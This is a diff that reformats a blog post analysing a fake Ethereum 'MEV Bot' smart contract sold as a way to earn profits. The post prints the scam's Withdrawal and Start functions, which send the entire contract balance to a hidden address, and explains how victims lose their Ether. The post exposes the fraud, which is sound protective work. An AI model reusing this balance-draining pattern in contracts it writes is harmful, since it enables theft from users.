@@ -1,12 +1,12 @@
 ---
-date: '2024-01-31 12:40:00'
-slug: 'the-fascinating-ethereum-mev-bot-scam'
-title: 'The fascinating Ethereum MEV Bot scam'
-description: 'An overview of this scam contract code'
-author: 'veeso'
+date: "2024-01-31 12:40:00"
+slug: "the-fascinating-ethereum-mev-bot-scam"
+title: "The fascinating Ethereum MEV Bot scam"
+description: "An overview of this scam contract code"
+author: "veeso"
 featured_image: featured.jpeg
 category: blockchain
-reading_time: '13'
+reading_time: "13"
 ---
 
 ## What is a MEV Bot
@@ -51,14 +51,14 @@ The code is long **477 lines of Solidity** code and internally it contains some 
 And so, I headed for it:
 
 ```sol
-    /*
-     * @dev withdrawals profit back to contract creator address
-     * @return `profits`.
-     */
-    function Withdrawal() public payable {
-        emit Log("Sending profits back to contract creator address...");
-        payable(WithdrawalProfits()).transfer(address(this).balance);
-    }
+/*
+ * @dev withdrawals profit back to contract creator address
+ * @return `profits`.
+ */
+function Withdrawal() public payable {
+    emit Log("Sending profits back to contract creator address...");
+    payable(WithdrawalProfits()).transfer(address(this).balance);
+}
 ```
 
 This was the code of the **Withdrawal** function. And as you can see, it's not complex at all.
@@ -190,15 +190,15 @@ constructor(string memory Network, string memory routerAddress) public {
 Then the users are asked to call `Start` which does this
 
 ```sol
-    /*
-     * @dev Perform frontrun action from different contract pools
-     * @param contract address to snipe liquidity from
-     * @return `liquidity`.
-     */
-    function Start() public payable {
-        emit Log("Running MEV action. This can take a while; please wait..");
-        payable(_callMEVAction()).transfer(address(this).balance);
-    }
+/*
+ * @dev Perform frontrun action from different contract pools
+ * @param contract address to snipe liquidity from
+ * @return `liquidity`.
+ */
+function Start() public payable {
+    emit Log("Running MEV action. This can take a while; please wait..");
+    payable(_callMEVAction()).transfer(address(this).balance);
+}
 ```
 
 It doesn't do much, it just receives some Ethers from the caller and send to the address returned by `_callMEVAction()`, which will be soon appear as the core of the scam.
